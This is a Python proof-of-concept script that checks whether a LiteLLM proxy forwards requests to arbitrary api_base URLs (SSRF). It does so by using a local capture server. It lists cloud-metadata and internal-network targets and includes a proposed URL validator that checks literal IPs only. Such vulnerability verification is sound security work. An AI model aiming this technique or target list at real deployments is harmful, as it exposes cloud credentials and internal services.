#!/usr/bin/env python3
"""
verify_litellm_ssrf.py
---------------------
Verifies SSRF via unvalidated api_base parameter in LiteLLM

How it works:
  1. Starts a local capture server on port 18877
  2. Sends LiteLLM a request with api_base pointing to the capture server
  3. If LiteLLM forwards the request — SSRF confirmed (captured by local server)
  4. Demonstrates what a fixed validator would block (Step 3 runs standalone)

Requirements:
  - Python 3.8+
  - requests library (pip install requests)
  - LiteLLM proxy running: litellm --model gpt-3.5-turbo --port 4000
  - Port 18877 must be free (capture server)

Note:
  Step 1 and 2 require a running LiteLLM proxy.
  Step 3 (fix validator) runs without any proxy — tests pure Python logic.
  To run Step 3 only, the script can be modified; the is_safe_url() function
  is self-contained and has no external dependencies.

Usage:
  python3 verify_litellm_ssrf.py
  python3 verify_litellm_ssrf.py --endpoint http://localhost:4000/v1/chat/completions
  python3 verify_litellm_ssrf.py --endpoint http://192.168.1.100:4000/v1/chat/completions
"""

import argparse
import http.server
import ipaddress
import json
import queue
import sys
import threading
import time
from typing import Optional
from urllib.parse import urlparse

try:
    import requests
except ImportError:
    print("ERROR: requests library not found. Install with: pip install requests")
    sys.exit(1)

# ---------------------------------------------------------------------------
# Colors
# ---------------------------------------------------------------------------
RED    = "\033[91m"
GREEN  = "\033[92m"
YELLOW = "\033[93m"
CYAN   = "\033[96m"
BOLD   = "\033[1m"
RESET  = "\033[0m"

def red(s):    return f"{RED}{s}{RESET}"
def green(s):  return f"{GREEN}{s}{RESET}"
def yellow(s): return f"{YELLOW}{s}{RESET}"
def cyan(s):   return f"{CYAN}{s}{RESET}"
def bold(s):   return f"{BOLD}{s}{RESET}"

# ---------------------------------------------------------------------------
# Banner
# ---------------------------------------------------------------------------
BANNER = f"""
{bold(cyan('╔══════════════════════════════════════════════════════════════╗'))}
{bold(cyan('║  LiteLLM SSRF Verifier — api_base Unvalidated URL Forwarding ║'))}
{bold(cyan('║  CVE: TBD  |  CVSS: 7.7 High  |  CWE-918                    ║'))}
{bold(cyan('║  Affected: litellm/litellm (all versions with proxy)        ║'))}
{bold(cyan('╚══════════════════════════════════════════════════════════════╝'))}
"""

# ---------------------------------------------------------------------------
# Capture server
# ---------------------------------------------------------------------------
CAPTURE_PORT = 18877
captured: queue.Queue = queue.Queue()

class CaptureHandler(http.server.BaseHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(length)
        captured.put({"method": "POST", "path": self.path, "body": body.decode(errors="replace")})
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.end_headers()
        self.wfile.write(b'{"error":"captured"}')

    def do_GET(self):
        captured.put({"method": "GET", "path": self.path, "headers": dict(self.headers)})
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.end_headers()
        self.wfile.write(b'captured')

    def log_message(self, *args):
        pass

def start_capture_server() -> threading.Thread:
    server = http.server.HTTPServer(("127.0.0.1", CAPTURE_PORT), CaptureHandler)
    t = threading.Thread(target=server.serve_forever, daemon=True)
    t.start()
    return t

# ---------------------------------------------------------------------------
# Test cases
# ---------------------------------------------------------------------------
TEST_URLS = [
    ("AWS IMDS",                "http://169.254.169.254/latest/meta-data/"),
    ("GCP metadata",            "http://metadata.google.internal/computeMetadata/v1/"),
    ("Azure metadata",          "http://169.254.169.253/metadata/instance"),
    ("Localhost HTTP",          "http://127.0.0.1:6379/"),
    ("Localhost Redis",         "http://localhost:6379/"),
    ("RFC1918 (10.x)",          "http://10.0.0.1:5432/"),
    ("RFC1918 (192.168.x)",     "http://192.168.1.1:27017/"),
    ("RFC1918 (172.16.x)",      "http://172.16.0.1:3306/"),
    ("Legitimate HTTPS URL",    "https://api.openai.com/"),
]

# URL that actually hits the local capture server — proves LiteLLM forwards without filtering
CAPTURE_URL = f"http://127.0.0.1:{CAPTURE_PORT}/chat/completions"

# ---------------------------------------------------------------------------
# SSRF prevention validator (proposed fix)
# ---------------------------------------------------------------------------
def is_safe_url(url: str) -> Optional[str]:
    """
    Returns None if URL is safe, or error message if blocked.
    This mirrors the proposed Go/Python fix.
    """
    try:
        parsed = urlparse(url)
    except Exception as e:
        return f"invalid URL: {e}"

    # Block non-HTTP schemes
    if parsed.scheme not in ("http", "https"):
        return f"URL scheme {parsed.scheme!r} not allowed"

    hostname = parsed.hostname or ""

    # Block known dangerous hostnames (cloud metadata + loopback aliases)
    blocked_hosts = {
        "169.254.169.254", "metadata.google.internal", "metadata.internal",
        "169.254.169.253", "localhost", "ip6-localhost", "ip6-loopback",
    }
    if hostname.lower() in blocked_hosts:
        return "URL targets a restricted metadata host"

    # Try to parse as IP and check ranges
    try:
        ip = ipaddress.ip_address(hostname)
        if ip.is_loopback:
            return "URL resolves to loopback address"
        if ip.is_private:
            return "URL resolves to private RFC1918 address"
        if ip.is_link_local:
            return "URL resolves to link-local address"
    except ValueError:
        pass  # It's a hostname, not an IP

    return None  # SAFE

# ---------------------------------------------------------------------------
# Steps
# ---------------------------------------------------------------------------
def step1_sanity(endpoint: str) -> bool:
    print(f"\n{bold('[STEP 1] Sanity check — LiteLLM endpoint reachable')}")
    try:
        resp = requests.post(
            endpoint,
            json={"model": "test", "messages": [{"role": "user", "content": "test"}]},
            headers={"Authorization": "Bearer sk-dummy"},
            timeout=3,
        )
        print(green(f"  [+] LiteLLM endpoint accessible — HTTP {resp.status_code}"))
        return True
    except requests.exceptions.ConnectionError:
        print(red(f"  [-] Cannot reach LiteLLM at {endpoint}"))
        print(yellow("     Tip: Start LiteLLM with: litellm --model gpt-3.5-turbo --port 4000"))
        return False
    except Exception as e:
        print(red(f"  [-] Error: {e}"))
        return False

def step2_exploit(endpoint: str) -> bool:
    print(f"\n{bold('[STEP 2] Confirm SSRF — send api_base pointing to local capture server')}")
    print(f"  Capture server at {CAPTURE_URL}")
    print()

    # Drain queue
    while not captured.empty():
        try:
            captured.get_nowait()
        except queue.Empty:
            break

    try:
        requests.post(
            endpoint,
            json={
                "model": "gpt-3.5-turbo",
                "messages": [{"role": "user", "content": "test"}],
                "api_base": CAPTURE_URL,
            },
            headers={"Authorization": "Bearer sk-dummy"},
            timeout=3,
        )
    except Exception:
        pass

    time.sleep(0.3)
    items = []
    while not captured.empty():
        try:
            items.append(captured.get_nowait())
        except queue.Empty:
            break

    if items:
        print(red(f"  [VULN] LiteLLM forwarded request to capture server without filtering"))
        print(red(f"      → api_base: {CAPTURE_URL}"))
        print(red(f"      → captured: {items[0].get('method')} {items[0].get('path')}"))
        print()
        print(f"  Additional dangerous targets (not directly capturable):")
        for name, url in TEST_URLS:
            if url != "https://api.openai.com/":
                print(red(f"      • {name}: {url}"))
        return True
    else:
        print(yellow(f"  [?] Capture server received no requests — SSRF not confirmed"))
        print(yellow(f"      (LiteLLM may have blocked it, or proxy not running correctly)"))
        return False

def step3_fix():
    print(f"\n{bold('[STEP 3] Verify fix — proposed validator blocks dangerous URLs')}")
    print()

    all_blocked = True
    for name, url in TEST_URLS:
        err = is_safe_url(url)
        if url == "https://api.openai.com/":
            if err is None:
                print(green(f"  [+] ALLOWED (correct): {name}"))
            else:
                print(red(f"  [-] FALSE POSITIVE — blocked legit URL: {name}: {err}"))
                all_blocked = False
        else:
            if err is not None:
                print(green(f"  [+] BLOCKED: {name}  →  {err}"))
            else:
                print(red(f"  [-] FIX INCOMPLETE — {name} not blocked"))
                all_blocked = False

    return all_blocked

# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------
def main():
    parser = argparse.ArgumentParser(description="Verify LiteLLM api_base SSRF vulnerability")
    parser.add_argument("--endpoint", default="http://localhost:4000/v1/chat/completions",
                        help="LiteLLM endpoint URL")
    parser.add_argument("--skip-server", action="store_true",
                        help="Skip starting capture server (if already running)")
    args = parser.parse_args()

    print(BANNER)

    # Start capture server
    print(f"{bold('Setup:')} starting capture server on 127.0.0.1:{CAPTURE_PORT} ...")
    start_capture_server()
    time.sleep(0.2)
    print(green("  [+] Capture server ready"))

    try:
        # Step 1: sanity
        if not step1_sanity(args.endpoint):
            sys.exit(1)

        # Step 2: exploit
        vuln_confirmed = step2_exploit(args.endpoint)

        # Step 3: fix
        fix_works = step3_fix()

        # Summary
        print(f"\n{bold('='*64)}")
        if vuln_confirmed:
            print(red(bold("  RESULT: VULNERABLE — api_base forwarded to arbitrary hosts")))
            print(red(       "          An attacker can cause LiteLLM to make requests to:"))
            print(red(       "          • http://169.254.169.254/  (cloud IAM credentials)"))
            print(red(       "          • http://127.0.0.1:*       (internal services)"))
            print(red(       "          • RFC1918 ranges           (internal network pivot)"))
        else:
            print(yellow(bold("  RESULT: Could not confirm — check LiteLLM logs")))

        if fix_works:
            print(green(bold("  FIX:    Proposed validator correctly blocks all dangerous URLs")))
        else:
            print(red(bold("  FIX:    Proposed validator has gaps — review step 3 output")))

        print(f"{bold('='*64)}\n")

        if vuln_confirmed:
            sys.exit(0)
        else:
            sys.exit(2)

    except KeyboardInterrupt:
        print(yellow("\n[!] Interrupted by user"))
        sys.exit(1)

if __name__ == "__main__":
    main()
